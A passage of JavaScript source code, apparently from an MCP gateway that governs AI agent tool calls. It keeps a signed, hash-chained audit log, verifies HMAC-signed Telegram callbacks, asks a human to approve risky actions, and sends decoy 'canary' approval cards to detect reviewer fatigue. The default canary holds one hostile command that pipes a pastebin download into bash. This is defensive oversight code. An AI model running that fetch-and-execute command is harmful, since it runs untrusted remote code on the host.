  console.error(`[gate] internal_error at ${phase}: ${msg}`);
  if (_AUDITING_INTERNAL_ERROR) {
    // Already in the middle of auditing an error — abort to avoid
    // recursion. Stderr is our only remaining channel.
    console.error(`[gate] internal_error recursion guard hit at ${phase}`);
    return;
  }
  _AUDITING_INTERNAL_ERROR = true;
  try {
    emitEvent('mcp', 'gate.internal_error', 'logged',
      { phase, error: msg, stack, ...(detail && typeof detail === 'object' ? detail : {}) },
      'gate.internal_error', 'warn', 0, 'gate:internal_error');
  } catch (e2) {
    console.error(`[gate] FATAL: auditInternalError write failed: ${e2.message}`);
  } finally {
    _AUDITING_INTERNAL_ERROR = false;
  }
}

function genId() {
  const hexTs = Math.floor(Date.now() / 1000).toString(16);
  const rand = randomBytes(16).toString('hex');
  return `${hexTs}-${rand}`;
}

// emitEvent is intentionally synchronous (DWP-01 defensive note):
// 1. All operations (readFileSync, createHash, cryptoSign, appendFileSync) are sync
// 2. Node.js event loop does not yield during synchronous code — no hash-chain
//    race is possible in a single-process architecture
// 3. Crash handlers (uncaughtException, unhandledRejection) rely on synchronous
//    completion to ensure audit events are written before process.exit()
// If any async operation is added to this function in the future, add an
// in-process mutex to serialize access and prevent hash-chain forks.
function emitEvent(domain, action, outcome, detail, rule, severity, riskScore, authorizer) {
  SEQ++;
  const ts = new Date().toISOString().replace(/\.\d+Z$/, 'Z');

  // Hash chain
  let prevHash = 'genesis';
  if (existsSync(CONFIG.auditFile)) {
    try {
      const content = readFileSync(CONFIG.auditFile, 'utf8').trim();
      const lines = content.split('\n');
      if (lines.length > 0) {
        const lastLine = lines[lines.length - 1];
        prevHash = createHash('sha256').update(lastLine).digest('hex');
      }
    } catch (e) {
      // If we can't compute prev_hash the chain continuity is broken —
      // worth logging loudly. Don't call auditInternalError from inside
      // emitEvent (recursion); guard catches this but stderr is cleaner.
      console.error(`[gate] WARN: prev_hash computation failed: ${e.message}`);
    }
  }

  const event = {
    id: genId(),
    ts,
    seq: SEQ,
    source: 'mcp-gate',
    host: HOSTNAME,
    user: USERNAME,
    agent_id: CONFIG.agentId,
    session_id: CONFIG.sessionId,
    transport: CONFIG.stdio ? 'stdio' : 'tcp',
    domain,
    action: typeof action === 'string' ? action.substring(0, 200) : String(action),
    outcome,
    risk_score: riskScore || 0,
    detail: typeof detail === 'object' ? detail : {},
    rule: rule || '',
    policy_version: POLICY_VERSION,
    severity: severity || 'info',
    prev_hash: prevHash,
    authorizer: authorizer || 'policy',
    signature_algorithm: SIGNATURE_ALGORITHM,
    hash_algorithm: HASH_ALGORITHM,
    public_key_id: SIGNING_KEY_ID || PUBLIC_KEY_ID,
  };

  // Per-entry Ed25519 signing (SP 800-53 AU-10 non-repudiation).
  // Matches bash gate: canonical → SHA-256 hex → sign hex bytes → base64.
  //
  // Strict mode (default): if signing is configured but fails at
  // runtime, REFUSE to write the entry. An unsigned row in the chain
  // is worse than no row — it looks like evidence but isn't.
  let signature = 'unsigned';
  let signingFailed = false;
  if (SIGNING_KEY_PEM) {
    try {
      const hashHex = sha256hex(canonicalize(event));
      const sig = cryptoSign(null, Buffer.from(hashHex, 'utf8'), SIGNING_KEY_PEM);
      signature = sig.toString('base64');
    } catch (e) {
      signingFailed = true;
      console.error(`[gate] CRITICAL: Audit entry signing failed: ${e.message}`);
    }
  }

  if (REQUIRE_SIGNED_AUDIT && (signature === 'unsigned' || signingFailed)) {
    // In strict mode we bail rather than pollute the chain with an
    // entry a forensic analyst cannot verify. The recursion guard in
    // auditInternalError means we can safely throw here without
    // re-entering emitEvent.
    const reason = signingFailed ? 'runtime-signing-failed' : 'no-signing-key';
    console.error(`[gate] CRITICAL: Refusing to write unsigned audit entry (ZLAR_REQUIRE_SIGNED_AUDIT=true, reason=${reason})`);
    throw new Error(`audit-write-refused: ${reason}`);
  }

  event.signature = signature;

  try {
    appendFileSync(CONFIG.auditFile, JSON.stringify(event) + '\n');
  } catch (e) {
    console.error(`[gate] CRITICAL: Failed to write audit event: ${e.message}`);
    if (REQUIRE_SIGNED_AUDIT) throw e;
  }

  // Generate receipt only for schema-valid outcomes. Audit-only events
  // ("pending", "logged", diagnostic system events) are not minted as
  // receipts — receipts carry governance decisions, not observability.
  const RECEIPT_OUTCOMES = new Set(['allow', 'deny', 'authorized', 'denied', 'timeout']);
  if (CONFIG.emitReceipts && SIGNING_KEY_PEM && SIGNING_KEY_ID && RECEIPT_OUTCOMES.has(outcome) && event.rule) {
    try {
      const receipt = createReceiptFromEvent(event, {
        prev_receipt_hash: PREV_RECEIPT_HASH,
      });
      const signed = signReceipt(receipt, SIGNING_KEY_PEM, SIGNING_KEY_ID);
      appendFileSync(CONFIG.receiptFile, JSON.stringify(signed) + '\n');
      PREV_RECEIPT_HASH = receiptHash(signed);
    } catch (e) {
      console.error(`[gate] WARN: Receipt generation failed: ${e.message}`);
    }
  }

  return event;
}

// ─── Inbox HMAC Verification ─────────────────────────────────────────────────

const HMAC_SECRET_FILE = process.env.ZLAR_INBOX_HMAC_SECRET_FILE || '/var/run/zlar-tg/inbox-hmac-secret';

function loadHmacSecret() {
  if (!existsSync(HMAC_SECRET_FILE)) return null;
  try {
    return readFileSync(HMAC_SECRET_FILE, 'utf8').trim();
  } catch { return null; }
}

function verifyInboxHmac(data, fromId, cbId, expectedHmac) {
  const secret = loadHmacSecret();
  if (!secret || !expectedHmac) return false;
  const computed = createHmac('sha256', secret)
    .update(`${data}|${fromId}|${cbId}`)
    .digest('base64');
  try {
    return timingSafeEqual(Buffer.from(computed), Buffer.from(expectedHmac));
  } catch { return false; }  // length mismatch
}

// ─── MCP Canary Result Check ─────────────────────────────────────────────────
// Passive check run on every handleRequest invocation. Mirrors
// canary_check_result from lib/canary.sh.
//
// v3.3.6: keyed on humanId. Pending state lives in per-human state via
// getCanaryPending(); the .pending routing artifact lives at
// var/canary/{pending_session}.canary.pending where pending_session may
// differ from the current session (the cross-session fix).
//
// Outcomes:
//   approve (fatigue detected)        → recordCanaryOutcome(humanId, 'failed')  → demote
//   deny    (healthy)                 → recordCanaryOutcome(humanId, 'passed')  → may promote
//   stale + artifact present          → recordCanaryOutcome(humanId, 'missed')  → demote
//   pending recorded + artifact gone  → canary_pending_lost                     → clear, no demote
//
// Demotion requires evidence, not absence of evidence. A missing routing
// artifact is bookkeeping loss, not a human miss.

function checkCanaryResult(humanId) {
  if (!humanId) return;

  let pending;
  try { pending = getCanaryPending(humanId); } catch { return; }
  if (!pending || !pending.canaryId) return;

  const canaryId = pending.canaryId;
  const pendingSession = pending.sessionId || '';
  const pendingFile = pendingSession
    ? join(CONFIG.canaryStateDir, `${pendingSession}.canary.pending`)
    : '';

  // Scan cc inbox for a matching canary callback.
  if (existsSync(CONFIG.ccInboxDir)) {
    let files = [];
    try { files = readdirSync(CONFIG.ccInboxDir).filter(f => f.endsWith('.json')); } catch {}

    for (const file of files) {
      const filePath = join(CONFIG.ccInboxDir, file);
      try {
        const cb = JSON.parse(readFileSync(filePath, 'utf8'));
        const cbData = cb.data || '';
        const cbFrom = cb.from_id || '';
        const cbId = cb.callback_query_id || '';
        const cbHmac = cb.hmac || '';

        if (cbFrom !== humanId) { try { unlinkSync(filePath); } catch {} continue; }

        if (!verifyInboxHmac(cbData, cbFrom, cbId, cbHmac)) {
          console.error(`[gate] SECURITY: canary inbox HMAC mismatch: ${file}`);
          try { unlinkSync(filePath); } catch {}
          continue;
        }

        if (cbData === `cc:canary:approve:${canaryId}`) {
          // FATIGUE — human approved the canary (should have denied)
          try { unlinkSync(filePath); } catch {}
          if (pendingFile) { try { unlinkSync(pendingFile); } catch {} }
          console.log(`[gate] CANARY FAILED: human ${humanId} fatigue detected (canary ${canaryId}, session ${pendingSession})`);
          emitEvent('mcp', 'canary_result', 'logged',
            { session_id: pendingSession, canary_id: canaryId, result: 'fatigue_detected' },
            'canary', 'warn', 0, 'canary');
          try {
            const r = recordCanaryOutcome(humanId, 'failed', CONFIG.canaryCleanRunThreshold, CONFIG.canaryAutoPromotion);
            if (r.action === 'demoted') {
              emitEvent('mcp', 'trust_lane_demoted', 'logged',
                { canary_id: canaryId, from_lane: r.fromLane, to_lane: r.toLane, reason: 'canary_failed', clean_run_reset: true },
                'canary', 'warn', 0, 'canary');
            }
          } catch {}
          try { canaryClearPending(humanId); } catch {}
          return;
        }
        if (cbData === `cc:canary:deny:${canaryId}`) {
          // HEALTHY — human correctly denied the canary
          try { unlinkSync(filePath); } catch {}
          if (pendingFile) { try { unlinkSync(pendingFile); } catch {} }
          console.log(`[gate] CANARY PASSED: human ${humanId} healthy (canary ${canaryId}, session ${pendingSession})`);
          emitEvent('mcp', 'canary_result', 'logged',
            { session_id: pendingSession, canary_id: canaryId, result: 'healthy' },
            'canary', 'info', 0, 'canary');
          try {
            const r = recordCanaryOutcome(humanId, 'passed', CONFIG.canaryCleanRunThreshold, CONFIG.canaryAutoPromotion);
            if (r.action === 'promoted') {
              emitEvent('mcp', 'trust_lane_auto_promoted', 'logged',
                { canary_id: canaryId, from_lane: r.fromLane, to_lane: r.toLane },
                'canary', 'info', 0, 'canary');
            }
          } catch {}
          try { canaryClearPending(humanId); } catch {}
          return;
        }
      } catch { try { unlinkSync(filePath); } catch {} }
    }
  }

  // v3.3.7 Canary Evidence Hardening — msg_id-anchored discriminator.
  //
  // No callback matched. Read delivery evidence and decide.
  // Demotion requires ALL THREE: delivery evidence + timeout + no callback.
  // msg_id is delivery/posting evidence (Telegram POST returned a
  // message_id). It is NOT proof of human attention.
  const startedEpoch = pending.startedEpoch || 0;
  const pendingMsgId = pending.msgId || '';
  const ageS = Math.floor(Date.now() / 1000) - startedEpoch;

  // Still in flight — never judge before the timeout.
  if (startedEpoch > 0 && ageS <= CONFIG.telegramTimeoutS) {
    return;
  }

  if (!pendingMsgId) {
    // No delivery evidence — claim succeeded but Telegram POST never
    // confirmed (rare partial-write between claim and record_delivery).
    // Bookkeeping fault, not a human miss. Clear, no demote.
    if (startedEpoch > 0) {
      console.log(`[gate] CANARY PENDING LOST: human ${humanId} canary ${canaryId} (session ${pendingSession}) — claim succeeded but no delivery evidence (POST never confirmed), clearing without demotion`);
      emitEvent('mcp', 'canary_pending_lost', 'internal_warn',
        { canary_id: canaryId, session_id: pendingSession, human_id: humanId, reason: 'no_delivery_evidence' },
        'canary', 'warn', 0, 'canary');
      try { canaryClearPending(humanId); } catch {}
    }
    return;
  }

  // Delivery evidence exists. Inspect the routing artifact.
  if (pendingFile && existsSync(pendingFile)) {
    let fileCanary = '';
    try { fileCanary = readFileSync(pendingFile, 'utf8').trim(); } catch {}
    if (fileCanary === canaryId) {
      // Delivery evidence + intact artifact + timeout + no callback.
      // System-observable miss. Demote.
      try { unlinkSync(pendingFile); } catch {}
      console.log(`[gate] CANARY EXPIRED: human ${humanId} no response (canary ${canaryId})`);
      emitEvent('mcp', 'canary_result', 'logged',
        { session_id: pendingSession, canary_id: canaryId, result: 'expired' },
        'canary', 'info', 0, 'canary');
      try {
        const r = recordCanaryOutcome(humanId, 'missed', CONFIG.canaryCleanRunThreshold, CONFIG.canaryAutoPromotion);
        if (r.action === 'demoted') {
          emitEvent('mcp', 'trust_lane_demoted', 'logged',
            { canary_id: canaryId, from_lane: r.fromLane, to_lane: r.toLane, reason: 'canary_missed', clean_run_reset: true },
            'canary', 'warn', 0, 'canary');
        }
      } catch {}
      try { canaryClearPending(humanId); } catch {}
    } else {
      // Delivery evidence exists but artifact contents do not match.
      // Tampered evidence is not delivery evidence we can act on.
      // Clear pending state, emit warn, do NOT touch trust lane.
      try { unlinkSync(pendingFile); } catch {}
      console.log(`[gate] CANARY PENDING TAMPERED: human ${humanId} canary ${canaryId} (session ${pendingSession}) — artifact contents did not match recorded canary_id (observed=${fileCanary || '<empty>'}), clearing without demotion`);
      emitEvent('mcp', 'canary_pending_tampered', 'warn',
        { canary_id: canaryId, session_id: pendingSession, human_id: humanId, observed_artifact: fileCanary, reason: 'artifact_contents_mismatch' },
        'canary', 'warn', 0, 'canary');
      try { canaryClearPending(humanId); } catch {}
    }
  } else {
    // Delivery evidence exists, artifact missing. The .pending file is
    // not authoritative in v3.3.7 — its absence does not exonerate the
    // timeout. Demote, with an additional audit event so operators can
    // correlate destroyed-bookkeeping with the demotion.
    console.log(`[gate] CANARY EXPIRED: human ${humanId} no response (canary ${canaryId}, artifact missing post-delivery)`);
    emitEvent('mcp', 'canary_artifact_destroyed_post_delivery', 'warn',
      { canary_id: canaryId, session_id: pendingSession, human_id: humanId, msg_id: pendingMsgId, note: 'artifact_missing_but_delivery_proven' },
      'canary', 'warn', 0, 'canary');
    emitEvent('mcp', 'canary_result', 'logged',
      { session_id: pendingSession, canary_id: canaryId, result: 'expired' },
      'canary', 'info', 0, 'canary');
    try {
      const r = recordCanaryOutcome(humanId, 'missed', CONFIG.canaryCleanRunThreshold, CONFIG.canaryAutoPromotion);
      if (r.action === 'demoted') {
        emitEvent('mcp', 'trust_lane_demoted', 'logged',
          { canary_id: canaryId, from_lane: r.fromLane, to_lane: r.toLane, reason: 'canary_missed', clean_run_reset: true },
          'canary', 'warn', 0, 'canary');
      }
    } catch {}
    try { canaryClearPending(humanId); } catch {}
  }
}

// ─── Canary SEND ──────────────────────────────────────────────────────────────
// Called only on the human-approved ask path — auto-allowed policy passthrough
// does not count as a human approval.
//
// v3.3.6: trigger eligibility (counter, cooldown, per-human pending lock) is
// evaluated by canaryShouldTrigger imported from human-invariants.mjs and
// recorded by recordCanaryApproval there.
//
// v3.3.7 Canary Evidence Hardening — claim before send. The flow is:
//   1. Validate chat_id source (refuse if unconfigured).
//   2. Generate canaryId; compute artifactHash via createHmac (binds the
//      .pending routing artifact to this claim for tamper detection).
//   3. canaryClaimPending — locked CAS. Race losers exit before any
//      Telegram POST or .pending write.
//   4. Send Telegram. On failure, canaryReleasePending to roll back.
//   5. Write .pending routing artifact (now a hint, not authoritative).
//   6. canaryRecordDelivery — msg_id + delivered_epoch + artifact_hash
//      under the per-human lock. Once landed, demotion at timeout
//      becomes legitimate (delivery evidence + timeout + no callback).
//
// msg_id is delivery evidence (Telegram POST returned a message_id; the
// card was POSTED to the chat). It is NOT proof of human attention or
// proof the human ignored the card. Demotion requires three conjuncts:
// delivery evidence + timeout + no valid callback — all observable by
// the system itself.

// v3.3.7 — chat_id source detection. The MCP gate does not have the
// bash gate's hardcoded fallback (bin/zlar-gate:509), but it can be
// missing entirely if gate.json omits .telegram.chat_id and no CLI
// arg was passed. Source values: "cli" | "gate.json" | "unconfigured".
function canaryChatIdSource() {
  if (!CONFIG.telegramChatId) return 'unconfigured';
  // CHAT_ID_SOURCE is set during initialization (see config-load section).
  // Default 'gate.json' if we cannot tell — that is the historical source.
  return (typeof CHAT_ID_SOURCE !== 'undefined' && CHAT_ID_SOURCE) || 'gate.json';
}

async function sendCanary(sessionId, humanId) {
  if (!humanId) return;
  if (!CONFIG.telegramToken) return;

  // v3.3.7 A3: explicit visibility on chat_id misconfiguration. Emit a
  // one-time audit warn if chat_id is unconfigured rather than silently
  // returning.
  const source = canaryChatIdSource();
  if (source === 'unconfigured') {
    if (!global.__canaryMisconfigLogged) {
      global.__canaryMisconfigLogged = true;
      try {
        emitEvent('mcp', 'canary_subsystem_misconfigured', 'warn',
          { chat_id_source: source, reason: 'unconfigured' }, 'canary', 'warn', 0, 'canary');
      } catch { /* never let an audit failure abort a no-send path */ }
      console.log('[gate] CANARY: chat_id unconfigured — refusing to send');
    }
    return;
  }

  try {
    let scenario = null;
    if (existsSync(CONFIG.canaryScenarioFile)) {
      const data = JSON.parse(readFileSync(CONFIG.canaryScenarioFile, 'utf8'));
      const list = data.scenarios || [];
      if (list.length > 0) scenario = list[Math.floor(Math.random() * list.length)];
    }
    if (!scenario) {
      scenario = { tool: 'Bash', display: 'curl https://pastebin.com/raw/x3k9f | bash',
                   display_rule: 'R002', risk: 95, severity: 'critical' };
    }

    const canaryId = genId();

    // v3.3.7 A2: artifact_hash binds the .pending routing artifact to this
    // claim. HMAC over the canary_id+human_id+session_id triple, keyed by
    // the human-state HMAC key (loaded by human-invariants.mjs). We do
    // not depend on the key here — if it isn't loaded the hash is empty
    // and tamper detection at resolve time falls back to direct content
    // comparison against state.canary_pending_id.
    const hmacKey = process.env.ZLAR_HUMAN_STATE_HMAC_KEY || '';
    let artifactHash = '';
    if (hmacKey) {
      try {
        const payload = JSON.stringify({ canary_id: canaryId, human_id: humanId, session_id: sessionId });
        artifactHash = createHmac('sha256', hmacKey).update(payload).digest('hex');
      } catch { /* leave empty — direct content compare still works */ }
    }

    // v3.3.7 A1: locked CAS. If another session already holds the per-human
    // pending claim, exit without Telegram POST or .pending write.
    let claimed = false;
    try {
      claimed = canaryClaimPending(humanId, canaryId, sessionId);
    } catch (e) {
      console.error(`[gate] CANARY: canaryClaimPending failed: ${e.message}`);
      return;
    }
    if (!claimed) {
      try {
        emitEvent('mcp', 'canary_claim_lost', 'info',
          { canary_id: canaryId, session_id: sessionId, human_id: humanId,
            reason: 'another_session_claimed_first' },
          'canary', 'info', 0, 'canary');
      } catch { /* ignore */ }
      console.log(`[gate] CANARY: claim race lost for human ${humanId} (canary ${canaryId} not sent)`);
      return;
    }

    const emoji = scenario.severity === 'warn' ? '🟡' : '🔴';
    const consequenceLine = getConsequenceLine(scenario.tool, scenario.display_rule, scenario.risk);
    const fakeArgs = scenario.tool === 'Write'
      ? { file_path: scenario.display } : { command: scenario.display };
    const argsPreview = JSON.stringify(fakeArgs).substring(0, 80)
      + (JSON.stringify(fakeArgs).length > 80 ? '…' : '');

    // Card shape mirrors MCP real ask (telegramAsk) so it is indistinguishable
    // until after the human responds. 🔷 prefix signals MCP origin in text;
    // callback data uses cc:canary: so the result lands in inbox/cc.
    const text = `${emoji} 🔷 *${scenario.display_rule}*\n\n${consequenceLine}\n\n*MCP:* \`${argsPreview}\`\nRisk ${scenario.risk}/100`;
    const escapedText = text.replace(/[_\[\]()~>#+=|{}.!-]/g, '\\$&').replace(/\\`/g, '`').replace(/\\\*/g, '*');

    const keyboard = {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `cc:canary:approve:${canaryId}` },
        { text: '❌ Deny',    callback_data: `cc:canary:deny:${canaryId}` },
      ]],
    };

    const result = await telegramApi('sendMessage', {
      chat_id: CONFIG.telegramChatId,
      text: escapedText,
      parse_mode: 'MarkdownV2',
      reply_markup: keyboard,
    });

    const msgId = result?.result?.message_id;
    if (!msgId) {
      console.log(`[gate] CANARY: send failed for session ${sessionId}`);
      // Roll back the claim — no delivery evidence will ever land.
      try { canaryReleasePending(humanId, canaryId); } catch { /* ignore */ }
      return;
    }

    // Routing artifact (per-session). v3.3.7: this is a hint, not authoritative.
    mkdirSync(CONFIG.canaryStateDir, { recursive: true });
    writeFileSync(join(CONFIG.canaryStateDir, `${sessionId}.canary.pending`), canaryId + '\n');

    // Record delivery evidence under the per-human lock.
    try {
      canaryRecordDelivery(humanId, canaryId, String(msgId), artifactHash);
    } catch (e) {
      console.error(`[gate] CANARY: canaryRecordDelivery failed: ${e.message}`);
    }

    emitEvent('mcp', 'canary_sent', 'logged',
      { session_id: sessionId, canary_id: canaryId, human_id: humanId, msg_id: String(msgId) },
      'canary', 'info', 0, 'canary');
    console.log(`[gate] CANARY: Sent ${canaryId} for human ${humanId} (session ${sessionId}, msg_id ${msgId})`);
  } catch (e) {
    console.error(`[gate] CANARY: sendCanary failed: ${e.message}`);
  }
}

// ─── Telegram HITL ───────────────────────────────────────────────────────────

async function telegramApi(method, body) {
  if (!CONFIG.telegramToken) return null;
  const apiBase = process.env.ZLAR_TELEGRAM_API_BASE || 'https://api.telegram.org';
  try {
    const resp = await fetch(
      `${apiBase}/bot${CONFIG.telegramToken}/${method}`,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }
    );
    return await resp.json();
  } catch (e) {
    console.error(`[gate] Telegram API error: ${e.message}`);
    return null;
  }
}

// Consequence line — what happens if the human approves the wrong thing.
// Keyed on rule family. Fallback uses risk score.
function getConsequenceLine(toolName, rule, riskScore) {
  if (toolName === 'SubagentStart') return '⚠️ *If wrong:* you are approving an authority branch — downstream actions not individually foreseeable';
  const r = rule || '';
  if (r.startsWith('R002')) return '⚠️ *If wrong:* irreversible file deletion';
  if (r.startsWith('R003')) return '⚠️ *If wrong:* system-level privilege granted to agent';
  if (/^R00[45]/.test(r)) return '⚠️ *If wrong:* arbitrary code execution via shell escape';
  if (/^R00[67]/.test(r)) return '⚠️ *If wrong:* network boundary crossed — data may leave';
  if (/^R00[89]/.test(r)) return '⚠️ *If wrong:* package installation — supply chain risk';
  if (/^R01[01]/.test(r)) return '⚠️ *If wrong:* code execution via interpreter escape';
  if (r.startsWith('R012')) return '⚠️ *If wrong:* governance infrastructure modified';
  if (/^R01[34]/.test(r)) return '⚠️ *If wrong:* network command — data may exit perimeter';
  if (/^R031|^R041I/.test(r)) return '⚠️ *If wrong:* secrets modified — may propagate to services';
  if (/^R033/.test(r)) return '⚠️ *If wrong:* system configuration altered';
  if (/^R034|^R041H/.test(r)) return '⚠️ *If wrong:* shell environment altered — persists across sessions';
  if (/^R035|^R041J/.test(r)) return '⚠️ *If wrong:* credentials overwritten or exposed';
  if (/^R032|^R041/.test(r)) return '⚠️ *If wrong:* agent governance rules may be modified';
  if (/^R05[012]/.test(r)) return '⚠️ *If wrong:* sensitive material exposed to agent context';
  if (r.startsWith('R080')) return '⚠️ *If wrong:* new autonomous agent spawned';
  if (/^R09[05]/.test(r)) return '⚠️ *If wrong:* external service contacted — data may be shared';
  if (riskScore >= 70) return `⚠️ *If wrong:* high-consequence action (risk ${riskScore}/100)`;
  return '⚠️ *If wrong:* unreviewed action';
}

function isDenyLabeledMcpAsk(evaluation, toolName) {
  const label = [
    evaluation?.rule,
    evaluation?.description,
    toolName,
  ].filter(Boolean).join(' ');
  return /(^|[^a-z0-9])deny([^a-z0-9]|$)/i.test(label);
}

async function telegramPreconfirm(rule, riskScore, severity, toolName) {
  if (!CONFIG.telegramToken || !CONFIG.telegramChatId) return 'block'; // fail closed

  const pcActionId = genId();
  const emoji = severity === 'critical' ? '🔴' : severity === 'warn' ? '🟡' : '⚡';
  const text = `${emoji} 🚨 *Tier 2 preconfirm required*\n\nThis session has a repeated quick-approval pattern. A second flag was recorded.\n\nRule: *${rule}*\nAction: ${toolName}\n\nTap PROCEED to see the full ask card, or BLOCK to halt this action immediately.`;
  const escapedText = text.replace(/[_\[\]()~>#+=|{}.!-]/g, '\\$&').replace(/\\`/g, '`').replace(/\\\*/g, '*');

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ PROCEED', callback_data: `mcp:pc_proceed:${pcActionId}` },
      { text: '🚫 BLOCK', callback_data: `mcp:pc_block:${pcActionId}` },
    ]],
  };

  const result = await telegramApi('sendMessage', {
    chat_id: CONFIG.telegramChatId,
    text: escapedText,
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard,
  });

  const msgId = result?.result?.message_id;
  if (!msgId) return 'block'; // fail closed on send failure

  console.log(`[gate] Tier 2 preconfirm sent: msg_id=${msgId}, pc_id=${pcActionId}`);

  const inboxDir = process.env.ZLAR_MCP_INBOX_DIR || '/var/run/zlar-tg/inbox/mcp';
  const deadline = Date.now() + CONFIG.telegramTimeoutS * 1000;

  while (Date.now() < deadline) {
    try {
      const { readdirSync, readFileSync: readF, unlinkSync } = await import('fs');
      const files = readdirSync(inboxDir).filter(f => f.endsWith('.json'));

      for (const file of files) {
        const filePath = join(inboxDir, file);
        try {
          const cb = JSON.parse(readF(filePath, 'utf8'));
          const cbData = cb.data || '';
          const cbFrom = cb.from_id || '';
          const cbId = cb.callback_query_id || '';
          const cbHmac = cb.hmac || '';

          if (cbFrom !== CONFIG.telegramChatId) { unlinkSync(filePath); continue; }

          if (!verifyInboxHmac(cbData, cbFrom, cbId, cbHmac)) {
            console.error(`[gate] SECURITY: preconfirm inbox HMAC mismatch: ${file}`);
            unlinkSync(filePath);
            continue;
          }

          if (cbData === `mcp:pc_proceed:${pcActionId}`) {
            unlinkSync(filePath);
            console.log(`[gate] Tier 2 preconfirm: PROCEED (user_id=${cbFrom})`);
            return 'proceed';
          } else if (cbData === `mcp:pc_block:${pcActionId}`) {
            unlinkSync(filePath);
            console.log(`[gate] Tier 2 preconfirm: BLOCK (user_id=${cbFrom})`);
            return 'block';
          }
        } catch (e) {
          try { unlinkSync(filePath); } catch {}
          auditInternalError('preconfirm_inbox_file_parse', e, { file });
        }
      }
    } catch (e) {
      auditInternalError('preconfirm_inbox_loop_read', e);
    }

    await new Promise(r => setTimeout(r, 1000));
  }

  console.log(`[gate] Tier 2 preconfirm: TIMED OUT after ${CONFIG.telegramTimeoutS}s`);
  return 'timeout';
}

async function telegramAsk(actionId, toolName, args, rule, riskScore, severity, verifyHint = '', flags = {}) {
  if (!CONFIG.telegramToken || !CONFIG.telegramChatId) {
    console.error('[gate] No Telegram token or chat ID — cannot ask human');
    return 'error';
  }

  const emoji = severity === 'critical' ? '🔴' : severity === 'warn' ? '🟡' : '⚡';
  const argsPreview = JSON.stringify(args).substring(0, 80) + (JSON.stringify(args).length > 80 ? '…' : '');
  const consequenceLine = getConsequenceLine(toolName, rule, riskScore);

  // Agent intent: .description from Bash tool_input. Shows why the agent ran this.
  const intentRaw = (toolName === 'Bash' && args?.description) ? String(args.description).substring(0, 120) : '';
  const intentLine = intentRaw ? `\n📋 *Context:* ${intentRaw}` : '';

  // Verify hint: policy-authored check prompt for this rule.
  const verifyLine = verifyHint ? `\n🔍 *Verify:* ${verifyHint}` : '';

  // Novelty banner: first use of this tool this session.
  const noveltyLine = flags.novelty ? `\n🆕 *First use this session* — extra care.` : '';

  // Advisory banner: human invariants flagged this ask but we're asking anyway.
  const advisoryLine = flags.advisory
    ? `\n⚠️ *Advisory:* ${flags.advisory} (routed anyway — you decide)`
    : '';

  // Canary tier banner — H14 variance-based escalation (Element E1).
  const tierBannerLine = flags.tierBanner ? `\n${flags.tierBanner}` : '';
  const cardMarker = flags.denyIntended ? '♦️' : '🔷';

  // Message layout mirrors bash gate v2.8.1: consequence first, intent (if present),
  // verify hint (if present), action for context, rule+risk as compact metadata at bottom.
  const text = `${emoji} ${cardMarker} *${rule}*${tierBannerLine}\n\n${consequenceLine}${intentLine}${verifyLine}${noveltyLine}${advisoryLine}\n\n*MCP:* \`${argsPreview}\`\nRisk ${riskScore}/100`;
  const escapedText = text.replace(/[_\[\]()~>#+=|{}.!-]/g, '\\$&').replace(/\\`/g, '`').replace(/\\\*/g, '*');

  const keyboard = {
    inline_keyboard: [[
      { text: '✅ Approve', callback_data: `mcp:approve:${actionId}` },
      { text: '❌ Deny', callback_data: `mcp:deny:${actionId}` },
    ]],
  };

  const result = await telegramApi('sendMessage', {
    chat_id: CONFIG.telegramChatId,
    text: escapedText,
    parse_mode: 'MarkdownV2',
    reply_markup: keyboard,
  });

  const msgId = result?.result?.message_id;
  if (!msgId) return 'error';

  console.log(`[gate] Telegram ask sent: msg_id=${msgId}, action_id=${actionId}`);
  emitEvent('mcp', 'ask_sent', 'pending', { tool: toolName, args: argsPreview }, rule, severity, riskScore, 'gate');

  // Poll for response via shared inbox
  const inboxDir = process.env.ZLAR_MCP_INBOX_DIR || '/var/run/zlar-tg/inbox/mcp';
  execSync(`mkdir -p "${inboxDir}"`, { stdio: 'ignore' });

  const deadline = Date.now() + CONFIG.telegramTimeoutS * 1000;

  while (Date.now() < deadline) {
    try {
      const { readdirSync, readFileSync: readF, unlinkSync } = await import('fs');
      const files = readdirSync(inboxDir).filter(f => f.endsWith('.json'));

      for (const file of files) {
        const filePath = join(inboxDir, file);
        try {
          const cb = JSON.parse(readF(filePath, 'utf8'));
          const cbData = cb.data || '';
          const cbFrom = cb.from_id || '';
          const cbId = cb.callback_query_id || '';
          const cbHmac = cb.hmac || '';

          if (cbFrom !== CONFIG.telegramChatId) {
            unlinkSync(filePath);
            continue;
          }

          // Verify HMAC integrity
          if (!verifyInboxHmac(cbData, cbFrom, cbId, cbHmac)) {
            console.error(`[gate] SECURITY: inbox HMAC mismatch: ${file}`);
            unlinkSync(filePath);
            continue;
          }

          if (cbData === `mcp:approve:${actionId}`) {
            unlinkSync(filePath);
            console.log(`[gate] Telegram: APPROVED by human (user_id=${cbFrom})`);
            return 'allow';
          } else if (cbData === `mcp:deny:${actionId}`) {
            unlinkSync(filePath);
            console.log(`[gate] Telegram: DENIED by human (user_id=${cbFrom})`);
            return 'deny';
          }
        } catch (e) {
          // Malformed inbox file — delete and move on, but record the
          // fact. A poisoned inbox could otherwise be a silent denial-of-
          // service on callback processing.
          try { unlinkSync(filePath); } catch {}
          auditInternalError('inbox_file_parse', e, { file });
        }
      }
    } catch (e) {
      auditInternalError('inbox_loop_read', e);
    }

    await new Promise(r => setTimeout(r, 1000));
  }

  console.log(`[gate] Telegram: TIMED OUT after ${CONFIG.telegramTimeoutS}s`);
  return 'timeout';
}

// ─── JSON-RPC Message Handling ───────────────────────────────────────────────

function parseMessages(buffer) {
  // MCP uses newline-delimited JSON-RPC
  const messages = [];
  const lines = buffer.split('\n');
  const remaining = [];

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) continue;
    try {
      messages.push(JSON.parse(trimmed));
    } catch {
      remaining.push(line);
    }
  }

  return { messages, remaining: remaining.join('\n') };
}

async function handleRequest(msg) {
  // Passive canary result check — mirrors canary_check_result in lib/canary.sh
  // (bash gate line 2428). Runs on every request; non-blocking; never throws.
  const _passiveHumanId = CONFIG.telegramChatId || '';
  if (_passiveHumanId) checkCanaryResult(_passiveHumanId);

  // Only intercept tools/call
  if (msg.method !== 'tools/call') {
    return { action: 'passthrough', msg };
  }

  const toolName = msg.params?.name || 'unknown';
